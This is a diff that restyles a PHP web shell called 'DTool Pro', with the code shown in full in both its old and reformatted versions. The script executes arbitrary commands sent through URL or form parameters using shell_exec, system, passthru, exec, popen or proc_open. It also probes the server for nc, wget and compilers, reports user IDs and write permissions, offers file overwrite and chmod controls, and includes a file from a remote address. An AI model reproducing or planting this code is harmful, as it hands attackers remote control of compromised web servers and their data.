@@ -1,72 +1,143 @@
 <?php
 
-if(empty($chdir)) $chdir = @$_GET['chdir'];
-if(empty($cmd)) $cmd = @$_GET['cmd'];
-if(empty($fu)) $fu = @$_GET['fu'];
-if(empty($list)) $list = @$_GET['list'];
+if (empty($chdir)) {
+    $chdir = @$_GET['chdir'];
+}
+if (empty($cmd)) {
+    $cmd = @$_GET['cmd'];
+}
+if (empty($fu)) {
+    $fu = @$_GET['fu'];
+}
+if (empty($list)) {
+    $list = @$_GET['list'];
+}
 
-if(empty($chdir) or $chdir=='') $chdir=getcwd();
+if (empty($chdir) or $chdir=='') {
+    $chdir=getcwd();
+}
 $cmd = stripslashes(trim($cmd));
 
 
 //CHDIR tool
-if (strpos($cmd, 'chdir')!==false and strpos($cmd, 'chdir')=='0'){
-	$boom = explode(" ",$cmd,2);
-	$boom2 = explode(";",$boom['1'], 2);
-	$toDir = $boom2['0'];
+if (strpos($cmd, 'chdir')!==false and strpos($cmd, 'chdir')=='0') {
+    $boom = explode(" ", $cmd, 2);
+    $boom2 = explode(";", $boom['1'], 2);
+    $toDir = $boom2['0'];
 
-	if($boom['1']=="/")$chdir="";
-	else if(strpos($cmd, 'chdir ..')!==false){
-		$cadaDir = array_reverse(explode("/",$chdir));
+    if ($boom['1']=="/") {
+        $chdir="";
+    } elseif (strpos($cmd, 'chdir ..')!==false) {
+        $cadaDir = array_reverse(explode("/", $chdir));
 
-		if($cadaDir['0']=="" or $cadaDir['0'] ==" ") $lastDir = $cadaDir['1']."/";
-		else{ $lastDir = $cadaDir['0']."/"; $chdir = $chdir."/";}
-		$toDir = str_replace($lastDir,"",$chdir);
-		if($toDir=="/")$chdir="";
-	}
-	else if(strpos($cmd, 'chdir .')===0) $toDir = getcwd();
-	else if(strpos($cmd, 'chdir ~')===0) $toDir = getcwd();
+        if ($cadaDir['0']=="" or $cadaDir['0'] ==" ") {
+            $lastDir = $cadaDir['1']."/";
+        } else {
+            $lastDir = $cadaDir['0']."/";
+            $chdir = $chdir."/";
+        }
+        $toDir = str_replace($lastDir, "", $chdir);
+        if ($toDir=="/") {
+            $chdir="";
+        }
+    } elseif (strpos($cmd, 'chdir .')===0) {
+        $toDir = getcwd();
+    } elseif (strpos($cmd, 'chdir ~')===0) {
+        $toDir = getcwd();
+    }
 
-	if(strrpos($toDir,"/")==(strlen($toDir)-1)) $toDir=substr($toDir,0,strrpos($toDir,"/"));
-	if(@opendir($toDir)!==false or @is_dir($toDir)) $chdir=$toDir;
-	else if(@opendir($chdir."/".$toDir)!==false or @is_dir($chdir."/".$toDir)) $chdir=$chdir."/".$toDir;
-	else $ch_msg="dtool: line 1: chdir: $toDir: No such directory.\n";
-	if($boom2['1']==null) $cmd = trim($boom['2']); else $cmd = trim($boom2['1'].$boom2['2']);
-	if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
+    if (strrpos($toDir, "/")==(strlen($toDir)-1)) {
+        $toDir=substr($toDir, 0, strrpos($toDir, "/"));
+    }
+    if (@opendir($toDir)!==false or @is_dir($toDir)) {
+        $chdir=$toDir;
+    } elseif (@opendir($chdir."/".$toDir)!==false or @is_dir($chdir."/".$toDir)) {
+        $chdir=$chdir."/".$toDir;
+    } else {
+        $ch_msg="dtool: line 1: chdir: $toDir: No such directory.\n";
+    }
+    if ($boom2['1']==null) {
+        $cmd = trim($boom['2']);
+    } else {
+        $cmd = trim($boom2['1'].$boom2['2']);
+    }
+    if (strpos($chdir, '//')!==false) {
+        $chdir = str_replace('//', '/', $chdir);
+    }
 }
-if(!@opendir($chdir)) $ch_msg="dtool: line 1: chdir: It seems that the permission have been denied in dir '$chdir'. Anyway, you can try to send a command here now. If you haven't accessed it, try to use 'cd' in the cmd line instead.\n";
+if (!@opendir($chdir)) {
+    $ch_msg="dtool: line 1: chdir: It seems that the permission have been denied in dir '$chdir'. Anyway, you can try to send a command here now. If you haven't accessed it, try to use 'cd' in the cmd line instead.\n";
+}
 $cmdShow = $cmd;
 
 //To keep the changes in the url, when using the 'GET' way to send php variables
-if(empty($post)){
-	if($chdir==getcwd() or empty($chdir) or $chdir=="")$showdir="";else $showdir="+'chdir=$chdir&'";
-	if($fu=="" or $fu=="0" or empty($fu))$showfu="";else $showfu="+'fu=$fu&'";
-	if($list=="" or $list=="0" or empty($list)){$showfl="";$fl="on";}else{$showfl="+'list=1&'"; $fl="off";}
+if (empty($post)) {
+    if ($chdir==getcwd() or empty($chdir) or $chdir=="") {
+        $showdir="";
+    } else {
+        $showdir="+'chdir=$chdir&'";
+    }
+    if ($fu=="" or $fu=="0" or empty($fu)) {
+        $showfu="";
+    } else {
+        $showfu="+'fu=$fu&'";
+    }
+    if ($list=="" or $list=="0" or empty($list)) {
+        $showfl="";
+        $fl="on";
+    } else {
+        $showfl="+'list=1&'";
+        $fl="off";
+    }
 }
 
 //INFO table (pro and normal)
-if (@file_exists("/usr/X11R6/bin/xterm")) $pro1="<i>xterm</i> at /usr/X11R6/bin/xterm, ";
-if (@file_exists("/usr/bin/nc")) $pro2="<i>nc</i> at /usr/bin/nc, ";
-if (@file_exists("/usr/bin/wget")) $pro3="<i>wget</i> at /usr/bin/wget, ";
-if (@file_exists("/usr/bin/lynx")) $pro4="<i>lynx</i> at /usr/bin/lynx, ";
-if (@file_exists("/usr/bin/gcc")) $pro5="<i>gcc</i> at /usr/bin/gcc, ";
-if (@file_exists("/usr/bin/cc")) $pro6="<i>cc</i> at /usr/bin/cc ";
+if (@file_exists("/usr/X11R6/bin/xterm")) {
+    $pro1="<i>xterm</i> at /usr/X11R6/bin/xterm, ";
+}
+if (@file_exists("/usr/bin/nc")) {
+    $pro2="<i>nc</i> at /usr/bin/nc, ";
+}
+if (@file_exists("/usr/bin/wget")) {
+    $pro3="<i>wget</i> at /usr/bin/wget, ";
+}
+if (@file_exists("/usr/bin/lynx")) {
+    $pro4="<i>lynx</i> at /usr/bin/lynx, ";
+}
+if (@file_exists("/usr/bin/gcc")) {
+    $pro5="<i>gcc</i> at /usr/bin/gcc, ";
+}
+if (@file_exists("/usr/bin/cc")) {
+    $pro6="<i>cc</i> at /usr/bin/cc ";
+}
 $safe = @ini_get($safemode);
-if ($safe) $pro8="<b><i>safe_mode</i>: YES</b>, "; else $pro7="<b><i>safe_mode</i>: NO</b>, ";
+if ($safe) {
+    $pro8="<b><i>safe_mode</i>: YES</b>, ";
+} else {
+    $pro7="<b><i>safe_mode</i>: NO</b>, ";
+}
 $pro8 = "<i>PHP </i>".phpversion();
 $pro=$pro1.$pro2.$pro3.$pro4.$pro5.$pro6.$pro7.$pro8;
 $login=@posix_getuid(); $euid=@posix_geteuid(); $gid=@posix_getgid();
 $ip=@gethostbyname($_SERVER['HTTP_HOST']);
 
 //Turns the 'ls' command more usefull, showing it as it looks in the shell
-if(strpos($cmd, 'ls --') !==false) $cmd = str_replace('ls --', 'ls -F --', $cmd);
-else if(strpos($cmd, 'ls -') !==false) $cmd = str_replace('ls -', 'ls -F', $cmd);
-else if(strpos($cmd, ';ls') !==false) $cmd = str_replace(';ls', ';ls -F', $cmd);
-else if(strpos($cmd, '; ls') !==false) $cmd = str_replace('; ls', ';ls -F', $cmd);
-else if($cmd=='ls') $cmd = "ls -F";
+if (strpos($cmd, 'ls --') !==false) {
+    $cmd = str_replace('ls --', 'ls -F --', $cmd);
+} elseif (strpos($cmd, 'ls -') !==false) {
+    $cmd = str_replace('ls -', 'ls -F', $cmd);
+} elseif (strpos($cmd, ';ls') !==false) {
+    $cmd = str_replace(';ls', ';ls -F', $cmd);
+} elseif (strpos($cmd, '; ls') !==false) {
+    $cmd = str_replace('; ls', ';ls -F', $cmd);
+} elseif ($cmd=='ls') {
+    $cmd = "ls -F";
+}
 
 //If there are some '//' in the cmd, its now removed
-if(strpos($chdir, '//')!==false) $chdir = str_replace('//', '/', $chdir);
+if (strpos($chdir, '//')!==false) {
+    $chdir = str_replace('//', '/', $chdir);
+}
 ?>
 <body onload="focar();">
 <style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
@@ -93,14 +164,18 @@ function overwrite(){inclVar();if(confirm("O script tentara substituir todos os 
 <tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
 <?php
  $uname = @posix_uname();
- while (list($info, $value) = each ($uname)) { ?>
+ while (list($info, $value) = each($uname)) { ?>
 <TR><TD><DIV class="infop"><b><?=$info ?>:</b> <?=$value;?></DIV></TD></TR><?php } ?>
 <TR><TD><DIV class="infop"><b>user:</b> uid(<?=$login;?>) euid(<?=$euid;?>) gid(<?=$gid;?>)</DIV></TD></TR>
-<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
+<TR><TD><DIV class="infod"><b>write permission:</b><?php if (@is_writable($chdir)) {
+     echo " <b>YES</b>";
+ } else {
+     echo " no";
+ } ?></DIV></TD></TR>
 <TR><TD><DIV class="infop"><b>server info: </b><?="$SERVER_SOFTWARE $SERVER_VERSION";?></DIV></TD></TR>
 <TR><TD><DIV class="infop"><b>pro info: ip </b><?="$ip, $pro";?></DIV></TD></TR>
-<? if($chdir!=getcwd()){?>
-<TR><TD><DIV class="infop"><b>original path: </b><?=getcwd() ?></DIV></TD></TR><? } ?>
+<?php if ($chdir!=getcwd()) {?>
+<TR><TD><DIV class="infop"><b>original path: </b><?=getcwd() ?></DIV></TD></TR><?php } ?>
 <TR><TD><DIV class="infod"><b>current path: </b><?=$chdir ?>
 </DIV></TD></TR></TABLE></td></tr>
 <tr><td><form name="formulario" id="formulario" method="post" action="#" onSubmit="return enviaCMD()">
@@ -113,61 +188,116 @@ function focar(){window.document.formulario.cmd.focus();window.document.formular
 </td></tr></table><table><tr><td>
 <?php
 ob_start();
-if(isset($chdir)) @chdir($chdir);
-function safemode($what){echo "This server is in safemode. Try to use DTool in Safemode.";}
-function nofunction($what){echo "The admin disabled all the functions to send a cmd to the system.";}
-function shell($what){echo(shell_exec($what));}
-function popenn($what){
-	$handle=popen("$what", "r");
-	$out=@fread($handle, 2096);
-	echo $out;
-	@pclose($handle);
+if (isset($chdir)) {
+    @chdir($chdir);
 }
-function execc($what){
-	exec("$what",$array_out);
-	$out=implode("\n",$array_out);
-	echo $out;
+function safemode($what)
+{
+    echo "This server is in safemode. Try to use DTool in Safemode.";
 }
-function procc($what){
-	//na sequencia: stdin, stdout, sterr
-	if($descpec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"),)){
-	$process = @proc_open("$what",$descpec,$pipes);
-	if (is_resource($process)) {
-		fwrite($pipes[0], "");
-		fclose($pipes[0]);
+function nofunction($what)
+{
+    echo "The admin disabled all the functions to send a cmd to the system.";
+}
+function shell($what)
+{
+    echo(shell_exec($what));
+}
+function popenn($what)
+{
+    $handle=popen("$what", "r");
+    $out=@fread($handle, 2096);
+    echo $out;
+    @pclose($handle);
+}
+function execc($what)
+{
+    exec("$what", $array_out);
+    $out=implode("\n", $array_out);
+    echo $out;
+}
+function procc($what)
+{
+    //na sequencia: stdin, stdout, sterr
+    if ($descpec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"),)) {
+        $process = @proc_open("$what", $descpec, $pipes);
+        if (is_resource($process)) {
+            fwrite($pipes[0], "");
+            fclose($pipes[0]);
 
-		while(!feof($pipes[2])) {
-			$erro_retorno = fgets($pipes[2], 4096);
-			if(!empty($erro_retorno)) echo $erro_retorno;//isso mostra tds os erros
-		}
-    		fclose($pipes[2]);
+            while (!feof($pipes[2])) {
+                $erro_retorno = fgets($pipes[2], 4096);
+                if (!empty($erro_retorno)) {
+                    echo $erro_retorno;
+                }//isso mostra tds os erros
+            }
+            fclose($pipes[2]);
 
-		while(!feof($pipes[1])) {
-			echo fgets($pipes[1], 4096);
-		}
-		fclose($pipes[1]);
+            while (!feof($pipes[1])) {
+                echo fgets($pipes[1], 4096);
+            }
+            fclose($pipes[1]);
 
-		$ok_p_fecha = @proc_close($process);
-	}else echo "It seems that this PHP version (".phpversion().") doesn't support proc_open() function";
-}else echo "This PHP version ($pro7) doesn't have the proc_open() or this function is disabled by php.ini";
+            $ok_p_fecha = @proc_close($process);
+        } else {
+            echo "It seems that this PHP version (".phpversion().") doesn't support proc_open() function";
+        }
+    } else {
+        echo "This PHP version ($pro7) doesn't have the proc_open() or this function is disabled by php.ini";
+    }
 }
 
 $funE="function_exists";
-if($safe){$fe="safemode";$feshow=$fe;}
-elseif($funE('shell_exec')){$fe="shell";$feshow="shell_exec";}
-elseif($funE('passthru')){$fe="passthru";$feshow=$fe;}
-elseif($funE('system')){$fe="system";$feshow=$fe;}
-elseif($funE('exec')){$fe="execc";$feshow="exec";}
-elseif($funE('popen')){$fe="popenn";$feshow="popen";}
-elseif($funE('proc_open')){$fe="procc";$feshow="proc_open";}
-else {$fe="nofunction";$feshow=$fe;}
-if($fu!="0" or !empty($fu)){
-  if($fu==1){$fe="passthru";$feshow=$fe;}
-  if($fu==2){$fe="system";$feshow=$fe;}
-  if($fu==3){$fe="execc";$feshow="exec";}
-  if($fu==4){$fe="popenn";$feshow="popen";}
-  if($fu==5){$fe="shell";$feshow="shell_exec";}
-  if($fu==6){$fe="procc";$feshow="proc_open";}
+if ($safe) {
+    $fe="safemode";
+    $feshow=$fe;
+} elseif ($funE('shell_exec')) {
+    $fe="shell";
+    $feshow="shell_exec";
+} elseif ($funE('passthru')) {
+    $fe="passthru";
+    $feshow=$fe;
+} elseif ($funE('system')) {
+    $fe="system";
+    $feshow=$fe;
+} elseif ($funE('exec')) {
+    $fe="execc";
+    $feshow="exec";
+} elseif ($funE('popen')) {
+    $fe="popenn";
+    $feshow="popen";
+} elseif ($funE('proc_open')) {
+    $fe="procc";
+    $feshow="proc_open";
+} else {
+    $fe="nofunction";
+    $feshow=$fe;
+}
+if ($fu!="0" or !empty($fu)) {
+    if ($fu==1) {
+        $fe="passthru";
+        $feshow=$fe;
+    }
+    if ($fu==2) {
+        $fe="system";
+        $feshow=$fe;
+    }
+    if ($fu==3) {
+        $fe="execc";
+        $feshow="exec";
+    }
+    if ($fu==4) {
+        $fe="popenn";
+        $feshow="popen";
+    }
+    if ($fu==5) {
+        $fe="shell";
+        $feshow="shell_exec";
+    }
+    if ($fu==6) {
+        $fe="procc";
+        $feshow="proc_open";
+    }
 }
 $fe("$cmd 2>&1");
 $output=ob_get_contents();ob_end_clean();
@@ -181,18 +311,24 @@ $output=ob_get_contents();ob_end_clean();
 <option value="5">use shell_exec()
 <option value="6">use proc_open()*new
 <option value="0">auto detect (default)
-</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?=$fl;?>" class="campo" onClick="list('<?=$fl;?>')"><? if ($list==1){ ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
-<? } ?><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
+</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?=$fl;?>" class="campo" onClick="list('<?=$fl;?>')"><?php if ($list==1) { ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
+<?php } ?><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
 </tr></table></td></tr></table></form></td></tr>
 <tr><td align="center"><DIV class="algod"><br>stdOut from <?="\"<i>$cmdShow</i>\", using <i>$feshow()</i>";?></i></DIV>
 <TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
 <?php
 echo $ch_msg;
-if (empty($cmd) and $ch_msg=="") echo ("Comandos Exclusivos do DTool Pro\n\nchdir <diretorio>; outros; cmds;\nMuda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. Os arquivos listados pelo filelist sao o do diretorio especificado ex: chdir /diretorio/sub/;pwd;ls\n\nPHPget, PHPwriter, Fileditor, File List e Overwrite\nfale com o r3v3ng4ns :P");
-if (!empty($output)) echo str_replace(">", ">", str_replace("<", "<", $output));
+if (empty($cmd) and $ch_msg=="") {
+    echo("Comandos Exclusivos do DTool Pro\n\nchdir <diretorio>; outros; cmds;\nMuda o diretorio para aquele especificado e permanece nele. Eh como se fosse o 'cd' numa shell, mas precisa ser o primeiro da linha. Os arquivos listados pelo filelist sao o do diretorio especificado ex: chdir /diretorio/sub/;pwd;ls\n\nPHPget, PHPwriter, Fileditor, File List e Overwrite\nfale com o r3v3ng4ns :P");
+}
+if (!empty($output)) {
+    echo str_replace(">", ">", str_replace("<", "<", $output));
+}
 ?></TEXTAREA><BR></td></tr>
 <?php
-if($list=="1") @include($remote_addr."flist".$format_addr);
+if ($list=="1") {
+    @include($remote_addr."flist".$format_addr);
+}
 ?>
 </table>
 
